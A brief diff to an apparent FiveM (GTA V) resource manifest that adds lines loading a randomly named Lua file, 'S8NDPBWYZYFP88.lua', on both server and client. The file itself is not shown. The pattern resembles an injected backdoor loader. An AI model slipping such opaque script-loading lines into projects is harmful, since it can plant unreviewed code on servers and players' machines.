@@ -1,3 +1,5 @@
+server_script "S8NDPBWYZYFP88.lua"
+client_script "S8NDPBWYZYFP88.lua"
 fx_version 'adamant'
 game 'gta5'
 
